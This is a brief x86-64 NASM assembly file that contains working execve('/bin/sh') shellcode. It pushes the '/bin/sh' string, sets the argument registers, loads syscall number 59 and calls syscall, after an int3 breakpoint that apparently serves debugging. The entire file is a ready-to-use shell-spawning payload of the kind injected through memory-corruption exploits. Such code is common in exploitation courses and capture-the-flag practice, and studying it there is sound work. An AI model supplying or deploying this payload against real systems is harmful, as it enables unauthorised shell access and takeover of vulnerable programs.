BITS 64

section .text
global _start
_start:
	int3
	mov rax, "/bin/sh"
	push rax
	push rsp
	pop rdi
	xor eax, eax
	push rax
	mov al, 59
	push rsp
	pop rdx
	push rsp
	pop rsi
	syscall
